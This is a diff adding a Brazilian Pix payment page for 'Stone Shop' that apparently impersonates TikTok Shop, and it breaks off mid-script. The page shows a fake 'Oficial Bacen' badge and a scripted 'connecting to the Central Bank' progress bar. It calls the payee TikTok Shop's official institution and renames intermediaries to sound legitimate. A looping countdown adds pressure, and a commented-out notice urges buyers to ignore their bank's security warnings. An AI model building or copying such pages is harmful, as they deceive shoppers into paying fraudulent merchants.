@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <script src="/js/pix-netlify.js"></script>
+<!-- Microsoft Clarity Code Start -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "yevctx4wrr");
+</script>
+<!-- Microsoft Clarity Code End -->
+
+  <!-- TikTok Pixel Code Start -->
+  <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject = t; var ttq = w[t] = w[t] || []; ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } }; for (var i = 0; i < ttq.methods.length; i++)ttq.setAndDefer(ttq, ttq.methods[i]); ttq.instance = function (t) {
+        for (
+          var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)ttq.setAndDefer(e, ttq.methods[n]); return e
+      }, ttq.load = function (e, n) {
+        var r = "https://analytics.tiktok.com/i18n/pixel/events.js", o = n && n.partner; ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {}; n = document.createElement("script")
+          ; n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t; e = document.getElementsByTagName("script")[0]; e.parentNode.insertBefore(n, e)
+      };
+      ttq.load('D96D3DJC77UE6HCFJDJ0');
+  ttq.load('D9KCL3RC77UBVR3T924G');
+  ttq.load('D9PF6N3C77U97D5QA7IG');
+      ttq.page();
+    }(window, document, 'ttq');
+  </script>
+  <!-- TikTok Pixel Code End -->
+  <!-- Spotify Pixel Code Start -->
+  <script>
+    (function (w, d) {
+      var id = 'spdt-capture', n = 'script';
+      if (!d.getElementById(id)) {
+        w.spdt = w.spdt || function () { (w.spdt.q = w.spdt.q || []).push(arguments); };
+        var e = d.createElement(n); e.id = id; e.async = 1;
+        e.src = 'https://pixel.byspotify.com/ping.min.js';
+        var s = d.getElementsByTagName(n)[0]; s.parentNode.insertBefore(e, s);
+      }
+      w.spdt('conf', { key: 'b2d850e2d437439d8f7ed7f0a10968f0' });
+      w.spdt('view');
+    })(window, document);
+  </script>
+  <!-- Spotify Pixel Code End -->
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+  <title>Código do pagamento - Stone Shop</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <style>
+    /* Estilização da página de Pix gerado com base na foto fixada */
+    html,
+    body {
+      height: auto !important;
+      overflow: visible !important;
+      overflow-y: auto !important;
+    }
+
+    body {
+      background: #f7f9fa;
+    }
+
+    .pix-container {
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      width: 100%;
+      max-width: 480px;
+      margin: 0 auto;
+      position: relative;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    .pix-header {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;
+      border-bottom: 1px solid #eee;
+      background: #fff;
+    }
+
+    .pix-header-back {
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+    }
+
+    .pix-header-title {
+      flex: 1;
+      text-align: center;
+      font-size: 16px;
+      font-weight: 700;
+      color: #111;
+      margin-right: 24px;
+    }
+
+    .pix-content {
+      flex: 1;
+      padding: 20px 16px 20px 16px;
+    }
+
+    /* Bloco informativo superior */
+    .pix-status-box {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      margin-bottom: 20px;
+    }
+
+    .pix-status-left {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .pix-status-title {
+      font-size: 19px;
+      font-weight: 800;
+      color: #111;
+    }
+
+    .pix-status-price {
+      font-size: 21px;
+      font-weight: 800;
+      color: #111;
+      margin-top: 2px;
+    }
+
+    .pix-status-expire {
+      font-size: 13px;
+      color: #666;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      margin-top: 6px;
+    }
+
+    .pix-expire-badge {
+      background: #ff2c55;
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 2px 6px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      gap: 3px;
+    }
+
+    .pix-status-date {
+      font-size: 12px;
+      color: #888;
+      margin-top: 2px;
+    }
+
+    .pix-status-icon-orange {
+      width: 44px;
+      height: 44px;
+      background: #ffa726;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 24px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    /* Caixa do Pix Copia e Cola */
+    .pix-code-box {
+      background: #fff;
+      border: 1px solid #ebebeb;
+      border-radius: 12px;
+      padding: 18px 16px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.03);
+      margin-bottom: 16px;
+    }
+
+    .pix-brand-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .pix-logo-img {
+      height: 22px;
+      object-fit: contain;
+    }
+
+    .pix-brand-name {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111;
+    }
+
+    .pix-textarea {
+      width: 100%;
+      font-size: 16px;
+      color: #111;
+      font-weight: 700;
+      border: none;
+      resize: none;
+      outline: none;
+      background: transparent;
+      padding: 0;
+      margin-bottom: 16px;
+      line-height: 1.4;
+      font-family: inherit;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .pix-copy-btn {
+      width: 100%;
+      background: #ff2c55;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 14px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: all 0.2s ease;
+    }
+
+    .pix-copy-btn:hover {
+      background: #e0244b;
+    }
+
+    .pix-copy-btn.copied-success {
+      background: #00b159 !important;
+    }
+
+    /* Nota Informativa */
+    .pix-instructions-note {
+      font-size: 12px;
+      color: #666;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    /* Como pagar */
+    .pix-instructions-section {
+      margin-top: 20px;
+    }
+
+    .pix-instructions-title {
+      font-size: 17px;
+      font-weight: 800;
+      color: #111;
+      margin-bottom: 12px;
+    }
+
+    .pix-instructions-desc {
+      font-size: 13px;
+      color: #444;
+      line-height: 1.6;
+    }
+
+    /* Footer Fixado */
+    .pix-footer {
+      position: sticky;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      padding: 12px 16px 24px 16px;
+      background: #fff;
+      border-top: 1px solid #eee;
+      box-sizing: border-box;
+      z-index: 10;
+    }
+
+    .pix-btn-ver-pedido {
+      width: 100%;
+      background: #f5f5f5;
+      color: #222;
+      border: none;
+      border-radius: 8px;
+      padding: 13px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      text-align: center;
+      transition: background 0.2s;
+    }
+
+    .pix-btn-ver-pedido:hover {
+      background: #e8e8e8;
+    }
+
+    /* Modal de Lista de Produtos do Pedido */
+    .pedido-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 480px;
+      height: 100vh;
+      background: #f7f9fa;
+      z-index: 99999;
+      overflow-y: auto;
+      flex-direction: column;
+    }
+
+    .pedido-modal-header {
+      background: #fff;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #eee;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .pedido-modal-title {
+      flex: 1;
+      text-align: center;
+      font-size: 16px;
+      font-weight: 700;
+      color: #111;
+      margin-right: 24px;
+    }
+
+    .pedido-modal-content {
+      padding: 16px;
+      flex: 1;
+    }
+
+    .pedido-card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+    }
+
+    .pedido-store-name {
+      font-size: 13px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 12px;
+    }
+
+    .pedido-item-row {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .pedido-item-img {
+      width: 64px;
+      height: 64px;
+      border-radius: 8px;
+      object-fit: contain;
+      transform: scale(0.85);
+      border: 1px solid #f0f0f0;
+    }
+
+    .pedido-item-details {
+      flex: 1;
+    }
+
+    .pedido-item-name {
+      font-size: 13px;
+      color: #222;
+      font-weight: 500;
+      line-height: 1.4;
+    }
+
+    .pedido-item-var {
+      font-size: 11px;
+      color: #888;
+      margin-top: 4px;
+    }
+
+    .pedido-item-price-qty {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 8px;
+    }
+
+    .pedido-item-price {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111;
+    }
+
+    .pedido-item-qty {
+      font-size: 12px;
+      color: #666;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="pix-container">
+
+    <!-- HEADER -->
+    <header class="pix-header">
+      <!-- TikTok Pixel Code Start -->
+      <script>
+        !function (w, d, t) {
+          w.TiktokAnalyticsObject = t; var ttq = w[t] = w[t] || []; ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } }; for (var i = 0; i < ttq.methods.length; i++)ttq.setAndDefer(ttq, ttq.methods[i]); ttq.instance = function (t) {
+            for (
+              var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)ttq.setAndDefer(e, ttq.methods[n]); return e
+          }, ttq.load = function (e, n) {
+            var r = "https://analytics.tiktok.com/i18n/pixel/events.js", o = n && n.partner; ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {}; n = document.createElement("script")
+              ; n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t; e = document.getElementsByTagName("script")[0]; e.parentNode.insertBefore(n, e)
+          };
+          ttq.load('D96D3DJC77UE6HCFJDJ0');
+  ttq.load('D9KCL3RC77UBVR3T924G');
+  ttq.load('D9PF6N3C77U97D5QA7IG');
+          ttq.page();
+        }(window, document, 'ttq');
+      </script>
+      <!-- TikTok Pixel Code End -->
+      <button class="pix-header-back" onclick="window.location.href='resumo.html'">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#222" stroke-width="2.5">
+          <polyline points="15 18 9 12 15 6"></polyline>
+        </svg>
+      </button>
+      <div class="pix-header-title">Código do pagamento</div>
+    </header>
+
+    <!-- CONTEÚDO PRINCIPAL -->
+    <div class="pix-content">
+
+      <!-- Status do pedido -->
+      <div class="pix-status-box">
+        <div class="pix-status-left">
+          <div class="pix-status-title">Aguardando o pagamento</div>
+          <div class="pix-status-price" id="pix-total-price">R$ 0,00</div>
+          <div class="pix-status-expire">
+            <span>Vence em</span>
+            <div class="pix-expire-badge">
+              <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="#fff" stroke-width="3"
+                style="margin-top: 1px;">
+                <circle cx="12" cy="12" r="10" />
+                <polyline points="12 6 12 12 16 14" />
+              </svg>
+              <span id="pix-countdown">23:59:59</span>
+            </div>
+          </div>
+          <div class="pix-status-date" id="pix-deadline-date">09:27, 29 de jun 2026</div>
+        </div>
+        <!-- Reloginho Laranja -->
+        <div class="pix-status-icon-orange">
+          <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#fff" stroke-width="2.5">
+            <circle cx="12" cy="12" r="10" />
+            <polyline points="12 6 12 12 16 14" />
+          </svg>
+        </div>
+      </div>
+
+      <!-- Bloco Copia e Cola -->
+      <div class="pix-code-box">
+        <div class="pix-brand-row">
+          <img class="pix-logo-img" src="../logopix/image.png" onerror="this.style.display='none'" alt="Pix">
+          <span class="pix-brand-name">PIX</span>
+          <span id="pix-badge-status" style="margin-left:auto;font-size:11px;font-weight:700;padding:3px 8px;border-radius:12px;background:#e8f8f0;color:#00a854;display:none;">Oficial Bacen ✓</span>
+        </div>
+
+        <!-- Barra de Progresso Interativa / Feedback visual enquanto o gateway gera -->
+        <div id="pix-loading-box" style="display:none;margin-bottom:14px;background:#f9fafb;border-radius:10px;padding:12px 14px;border:1px solid #f0f0f0;">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+            <div style="display:flex;align-items:center;gap:6px;">
+              <div style="width:8px;height:8px;border-radius:50%;background:#00f2fe;animation:tt-pulse 0.8s infinite alternate;"></div>
+              <div style="width:8px;height:8px;border-radius:50%;background:#fe2c55;animation:tt-pulse 0.8s infinite alternate;animation-delay:0.4s;"></div>
+              <span id="pix-loading-step-title" style="font-size:12px;font-weight:700;color:#111;">Conectando ao Banco Central...</span>
+            </div>
+            <span id="pix-loading-pct" style="font-size:12px;font-weight:800;color:#fe2c55;">15%</span>
+          </div>
+          <div style="width:100%;height:5px;background:#e5e7eb;border-radius:999px;overflow:hidden;">
+            <div id="pix-loading-bar-fill" style="width:15%;height:100%;background:linear-gradient(90deg, #00f2fe, #fe2c55);border-radius:999px;transition:width 0.4s ease;"></div>
+          </div>
+          <div id="pix-loading-step-desc" style="font-size:11px;color:#6b7280;margin-top:6px;line-height:1.4;">
+            Emitindo sua chave PIX exclusiva de pagamento seguro...
+          </div>
+        </div>
+
+        <input type="text" class="pix-textarea" id="pix-code-text" readonly
+          value="Aguardando geração do código PIX...">
+        <button class="pix-copy-btn" id="pix-copy-btn-el" onclick="copyPixCode()">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+          </svg>
+          <span id="pix-copy-btn-text">Copiar</span>
+        </button>
+      </div>
+
+      <!-- Texto explicativo cinza -->
+      <div class="pix-instructions-note">
+        Para acessar esta página no app, abra <strong>Loja &gt; Pedidos &gt; Sem pagamento &gt; Visualizar o
+          código</strong>
+      </div>
+
+      <!-- Como pagar com pix -->
+      <div class="pix-instructions-section">
+        <div class="pix-instructions-title">Como fazer pagamentos com PIX?</div>
+        <div class="pix-instructions-desc">
+          Copie o código de pagamento acima, selecione Pix no seu app de internet ou de banco e cole o código.
+        </div>
+        <!-- alerta no codigo:
+        <div style="margin-top: 15px; font-size: 13px; line-height: 1.5; color: #555;">
+          <strong>Atenção:</strong> Alguns bancos estão exibindo um alerta de segurança devido a uma instabilidade temporária na rede Pix. Mas fique tranquilo: esse pagamento é totalmente confiável e oficial do TikTok Shop! Basta prosseguir e confirmar o pagamento normalmente para concluir o seu pedido.
+        </div>
+        -->
+        <div id="acquirer-verification" style="margin-top: 15px; display: none;">
+          <div>
+            <div style="font-size: 17px; font-weight: 800; color: #111; margin-bottom: 8px;">Você pagará para:</div>
+            <div
+              style="display: flex; align-items: center; gap: 5px; font-size: 13px; font-weight: normal; color: #444;">
+              <span id="acquirer-name"></span>
+              <svg width="14" height="14" viewBox="0 0 24 24" style="flex-shrink: 0;">
+                <path fill="#007bff"
+                  d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.3 14.7L6.3 12.3l1.4-1.4 3 3 7.1-7.1 1.4 1.4-8.5 8.5z" />
+              </svg>
+            </div>
+          </div>
+          <div style="margin-top: 4px; font-size: 13px; color: #444; line-height: 1.6;">
+            Essa é a instituição oficial do TikTok Shop. Só efetue o pagamento se ver esse nome na hora de pagar.
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- FOOTER FIXADO -->
+    <footer class="pix-footer">
+      <button class="pix-btn-ver-pedido" onclick="openPedidoModal()">Ver pedido</button>
+    </footer>
+
+  </div>
+
+  <!-- MODAL DE LISTA DE PRODUTOS -->
+  <div class="pedido-modal" id="pedido-modal-box">
+    <div class="pedido-modal-header">
+      <button class="pix-header-back" onclick="closePedidoModal()">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#222" stroke-width="2.5">
+          <polyline points="15 18 9 12 15 6"></polyline>
+        </svg>
+      </button>
+      <div class="pedido-modal-title">Detalhes do Pedido</div>
+    </div>
+    <div class="pedido-modal-content">
+      <div class="pedido-card">
+        <div class="pedido-store-name">Stone Shop</div>
+        <div id="pedido-items-list">
+          <!-- Preenchido via Javascript -->
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function formatarMoeda(valor) {
+      return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+
+    // ===== Lê dados gerados pela SpeedPag =====
+    let pixCode = sessionStorage.getItem('sealpay_pix_code') || '';
+    let pixTxid = sessionStorage.getItem('sealpay_txid') || '';
+    const pixTotal = parseFloat(sessionStorage.getItem('sealpay_total') || '0');
+
+    // Exibe o valor correto (sem nenhum desconto)
+    const totalEl = document.getElementById('pix-total-price');
+    if (totalEl) {
+      totalEl.textContent = 'R$ ' + (pixTotal > 0 ? formatarMoeda(pixTotal) : '0,00');
+    }
+
+    function aplicarNomeAdquirente(code) {
+      if (!code) return;
+      let idx = code.indexOf("5802BR59");
+      if (idx !== -1) {
+        let len = parseInt(code.substr(idx + 8, 2), 10);
+        if (!isNaN(len)) {
+          let mName = code.substr(idx + 10, len);
+          let rawName = mName.replace(/_/g, ' ').trim();
+          let acqName = rawName.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');
+          acqName = acqName.replace(/\bOnlin\b/gi, "Online").replace(/\bMarketi\b/gi, "Marketing").replace(/\bLt\b/gi, "LTDA").replace(/\bLtd\b/gi, "LTDA").replace(/\bP$/i, "Pagamentos");
+          if (acqName.toLowerCase().includes("trusted")) acqName = "Trusted Payment Network";
+          else if (acqName.toLowerCase().includes("qr marketplace")) acqName = "Qr";
+          else if (acqName.toLowerCase().includes("np solucoes") || acqName.toLowerCase().includes("np_solucoes") || acqName.toLowerCase().includes("np solu")) acqName = "Np Pagamentos";
+          else if (acqName.toLowerCase().includes("rapidpag")) acqName = "Rapidpag";
+          else if (acqName.toLowerCase().includes("meiotransacional")) acqName = "Meio Transacional Protegido LTDA";
+          else if (acqName.toLowerCase().includes("amplopay")) acqName = "Amplo Pay Solucoes Digitais LTDA";
+          else if (acqName.toLowerCase().includes("amploprodutos")) acqName = "Amplo Produtos Digitais LTDA";
+          else if (acqName.toLowerCase().includes("brasil compras online")) acqName = "Brasil Compras Online";
+          else if (acqName.toLowerCase().includes("pixmarketplace")) acqName = "Pix Market Place LTDA";
+          else if (acqName.toLowerCase().includes("pagarme")) acqName = "Pagar.me Pagamentos";
+          else if (acqName.toLowerCase().includes("jumpfy")) acqName = "Jumpfy Sistema de Pagamento LTDA";
+          else if (acqName.toLowerCase().includes("xpag") || acqName.toLowerCase().includes("intermediador")) acqName = "Xpag Intermediadoras LTDA";
+          else if (acqName.toLowerCase().includes("mattos")) acqName = "Mattos Tech Intermediação";
+          if (acqName) {
+            const nameEl = document.getElementById('acquirer-name');
+            const boxEl = document.getElementById('acquirer-verification');
+            if (nameEl) nameEl.textContent = acqName;
+            if (boxEl) boxEl.style.display = 'block';
+          }
+        }
+      }
+    }
+
+    function definirPixPronto(code, txid) {
+      pixCode = code;
+      pixTxid = txid;
+      const codeEl = document.getElementById('pix-code-text');
+      if (codeEl) codeEl.value = code;
+
+      const badge = document.getElementById('pix-badge-status');
+      if (badge) badge.style.display = 'inline-block';
+
+      const loadingBox = document.getElementById('pix-loading-box');
+      if (loadingBox) {
+        const fill = document.getElementById('pix-loading-bar-fill');
+        const pct = document.getElementById('pix-loading-pct');
+        const title = document.getElementById('pix-loading-step-title');
+        const desc = document.getElementById('pix-loading-step-desc');
+        if (fill) fill.style.width = '100%';
+        if (pct) pct.textContent = '100%';
+        if (title) title.innerHTML = '<span style="color:#00a854;">✓ Chave PIX gerada com sucesso!</span>';
+        if (desc) desc.textContent = 'Copie o código abaixo e efetue o pagamento no app do seu banco.';
+        setTimeout(() => {
+          loadingBox.style.transition = 'all 0.5s ease';
+          loadingBox.style.opacity = '0';
+          setTimeout(() => loadingBox.style.display = 'none', 500);
+        }, 2200);
+      }
+
+      const btn = document.getElementById('pix-copy-btn-el');
+      if (btn) {
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        btn.style.cursor = 'pointer';
+        btn.style.background = '#ff2c55';
+        const txt = document.getElementById('pix-copy-btn-text');
+        if (txt) txt.textContent = 'Copiar';
+      }
+
+      aplicarNomeAdquirente(code);
+
+      // Atualiza pedido no localStorage
+      try {
+        let pedidos = JSON.parse(localStorage.getItem('famosinhos_pedidos') || '[]');
+        if (Array.isArray(pedidos) && pedidos.length > 0) {
+          pedidos[0].txid = txid || pedidos[0].txid;
+          pedidos[0].pix_code = code;
+          localStorage.setItem('famosinhos_pedidos', JSON.stringify(pedidos));
+        }
+      } catch (e) { }
+
+      if (txid) {
+        localStorage.setItem('last_main_txid', txid);
+        iniciarPolling(txid);
+      }
+    }
+
+    function iniciarGeracaoPixAsync(pendingRaw) {
+      let pendingOrder = null;
+      try { pendingOrder = JSON.parse(pendingRaw); } catch (e) { }
+      if (!pendingOrder || !pendingOrder.payload) return;
+
+      const loadingBox = document.getElementById('pix-loading-box');
+      if (loadingBox) loadingBox.style.display = 'block';
+
+      const btn = document.getElementById('pix-copy-btn-el');
+      if (btn) {
+        btn.disabled = true;
+        btn.style.opacity = '0.65';
+        btn.style.cursor = 'wait';
+        btn.style.background = '#333';
+        const txt = document.getElementById('pix-copy-btn-text');
+        if (txt) txt.textContent = 'Gerando código PIX...';
+      }
+
+      const codeEl = document.getElementById('pix-code-text');
+      if (codeEl) codeEl.value = 'Conectando ao Banco Central para emitir sua chave...';
+
+      // Animação progressiva realista enquanto o gateway processa
+      let progresso = 15;
+      const fill = document.getElementById('pix-loading-bar-fill');
+      const pct = document.getElementById('pix-loading-pct');
+      const title = document.getElementById('pix-loading-step-title');
+      const desc = document.getElementById('pix-loading-step-desc');
+
+      const progressTimer = setInterval(() => {
+        if (progresso < 93) {
+          if (progresso < 45) progresso += 4;
+          else if (progresso < 75) progresso += 2.2;
+          else progresso += 0.7;
+
+          const currentPct = Math.min(Math.round(progresso), 94);
+          if (fill) fill.style.width = currentPct + '%';
+          if (pct) pct.textContent = currentPct + '%';
+
+          if (currentPct > 70 && title && desc) {
+            title.textContent = 'Emitindo chave PIX dinâmica...';
+            desc.textContent = 'Quase pronto! O Banco Central está registrando o QR Code oficial.';
+          } else if (currentPct > 40 && title && desc) {
+            title.textContent = 'Validando transação com o emissor...';
+            desc.textContent = 'Gerando chave exclusiva para esta compra.';
+          }
+        }
+      }, 700);
+
+      const pixRoute = pendingOrder.route || '/api/create-pix';
+      fetch(pixRoute, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(pendingOrder.payload)
+      })
+      .then(r => r.json())
+      .then(data => {
+        clearInterval(progressTimer);
+        if (data && data.pix_code) {
+          sessionStorage.setItem('sealpay_pix_code', data.pix_code);
+          sessionStorage.setItem('sealpay_txid', data.txid || '');
+          sessionStorage.removeItem('pending_pix_order');
+          definirPixPronto(data.pix_code, data.txid || '');
+        } else {
+          throw new Error(data?.message || data?.error || 'Falha ao obter código PIX');
+        }
+      })
+      .catch(err => {
+        clearInterval(progressTimer);
+        console.error('[pix.html] Erro ao gerar PIX:', err);
+        if (title) title.innerHTML = '<span style="color:#fe2c55;">Instabilidade temporária</span>';
+        if (desc) desc.textContent = 'Não conseguimos conectar com o emissor. Clique abaixo para tentar novamente.';
+        if (btn) {
+          btn.disabled = false;
+          btn.style.opacity = '1';
+          btn.style.cursor = 'pointer';
+          btn.style.background = '#fe2c55';
+          const txt = document.getElementById('pix-copy-btn-text');
+          if (txt) txt.textContent = 'Tentar novamente';
+          btn.onclick = () => {
+            btn.onclick = copyPixCode;
+            iniciarGeracaoPixAsync(pendingRaw);
+          };
+        }
+      });
+    }
+
+    // Inicialização da verificação de PIX
+    if (pixCode) {
+      definirPixPronto(pixCode, pixTxid);
+    } else {
+      const pendingRaw = sessionStorage.getItem('pending_pix_order');
+      if (pendingRaw) {
+        iniciarGeracaoPixAsync(pendingRaw);
+      } else {
+        const codeEl = document.getElementById('pix-code-text');
+        if (codeEl) codeEl.value = 'Aguardando geração do código PIX...';
+      }
+    }
+
+    // ===== Itens do pedido (modal "Ver pedido") =====
+    function getCart() {
+      try {
+        const pedidos = JSON.parse(localStorage.getItem('famosinhos_pedidos') || '[]');
+        if (pedidos && pedidos.length > 0 && pedidos[0].itens) {
+          return pedidos[0].itens;
+        }
+        return JSON.parse(localStorage.getItem('famosinhos_cart') || '[]');
+      } catch (e) { return []; }
+    }
+
+    function renderPedidoItems() {
+      const cart = getCart();
+      const listEl = document.getElementById('pedido-items-list');
+      if (!listEl) return;
+
+      if (!cart.length) {
+        listEl.innerHTML = '<p style="color:#888;font-size:13px;text-align:center;">Nenhum produto no pedido.</p>';
+        return;
+      }
+
+      let html = '';
+      cart.forEach(item => {
+        const qty = item.qty || 1;
+        const price = typeof item.preco === 'number' ? item.preco : parseFloat(String(item.preco).replace(',', '.'));
+
+        let imgSrc = item.img || '';
+        if (!imgSrc.startsWith('http') && !imgSrc.startsWith('//')) {
+          if (imgSrc.startsWith('../')) imgSrc = imgSrc.substring(3);
+          imgSrc = '../' + imgSrc;
+        } else if (imgSrc.startsWith('//')) {
+          imgSrc = 'https:' + imgSrc;
+        }
+
+        html += `
+      <div class="pedido-item-row">
+        <img class="pedido-item-img" src="${imgSrc}" onerror="this.src='https://via.placeholder.com/64'">
+        <div class="pedido-item-details">
+          <div class="pedido-item-name">${item.nome}</div>
+          ${item.variacao ? `<div class="pedido-item-var">${item.variacao}</div>` : ''}
+          <div class="pedido-item-price-qty">
+            <span class="pedido-item-price">R$ ${formatarMoeda(price)}</span>
+            <span class="pedido-item-qty">x${qty}</span>
+          </div>
+        </div>
+      </div>
+    `;
+      });
+
+      listEl.innerHTML = html;
+    }
+
+    // ===== Copiar código PIX =====
+    function copyPixCode() {
+      const btn = document.querySelector('.pix-copy-btn');
+      const input = document.getElementById('pix-code-text');
+      const code = input ? input.value : pixCode;
+
+      if (!code || code.includes('Aguardando') || code.includes('Conectando')) {
+        return;
+      }
+
+      const execCopy = () => {
+        // Animação do botão sem usar alert
+        if (btn) {
+          const originalHTML = btn.innerHTML;
+          btn.innerHTML = `
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+        Copiado
+      `;
+          btn.classList.add('copied-success');
+
+          setTimeout(() => {
+            btn.innerHTML = originalHTML;
+            btn.classList.remove('copied-success');
+          }, 4000);
+        }
+      };
+
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(code).then(execCopy).catch(() => {
+          // Fallback
+          if (input) {
+            input.select();
+            document.execCommand('copy');
+            execCopy();
+          }
+        });
+      } else {
+        if (input) {
+          input.select();
+          document.execCommand('copy');
+          execCopy();
+        }
+      }
+    }
+
+    // ===== Relógio regressivo 24h =====
+    function startRegressivo() {
+      let time = 24 * 3600 - 1;
+      const countEl = document.getElementById('pix-countdown');
+      setInterval(() => {
+        const h = Math.floor(time / 3600);
+        const m = Math.floor((time % 3600) / 60);
+        const s = time % 60;
+        if (countEl) countEl.textContent =
+          String(h).padStart(2, '0') + ':' +
+          String(m).padStart(2, '0') + ':' +
+          String(s).padStart(2, '0');
+        time--;
+        if (time < 0) time = 24 * 3600 - 1;
+      }, 1000);
+    }
+
+    // ===== Data limite (24h no futuro) =====
+    function setDeadlineDate() {
+      const now = new Date();
+      now.setDate(now.getDate() + 1);
+      const dia = String(now.getDate()).padStart(2, '0');
+      const meses = ['jan', 'fev', 'mar', 'abr', 'mai', 'jun', 'jul', 'ago', 'set', 'out', 'nov', 'dez'];
+      const hora = String(now.getHours()).padStart(2, '0');
+      const min = String(now.getMinutes()).padStart(2, '0');
+      const el = document.getElementById('pix-deadline-date');
+      if (el) el.textContent = `${hora}:${min}, ${dia} de ${meses[now.getMonth()]} de ${now.getFullYear()}`;
+    }
+
+    // ===== Modal de pedido =====
+    function openPedidoModal() { document.getElementById('pedido-modal-box').style.display = 'flex'; }
+    function closePedidoModal() { document.getElementById('pedido-modal-box').style.display = 'none'; }
+
+    // ===== Polling: verifica a cada 5s se o pagamento foi confirmado =====
+    let _pollingInterval = null;
+    function iniciarPolling(txid) {
+      if (!txid) return;
+      _pollingInterval = setInterval(async () => {
+        try {
+          const resp = await fetch(`/api/payment-status/${txid}`);
+          const data = await resp.json();
+          console.log('[SealPay] Status:', data);
+
+          const pago = data.status === 'paid' ||
+            data.status === 'approved' ||
+            data.status === 'PAID' ||
+            data.status === 'APPROVED' ||
+            data.paid === true;
+
+          if (pago) {
+            clearInterval(_pollingInterval);
+            // Dispara evento Purchase do TikTok Pixel
+            try {
+              if (window.ttq) {
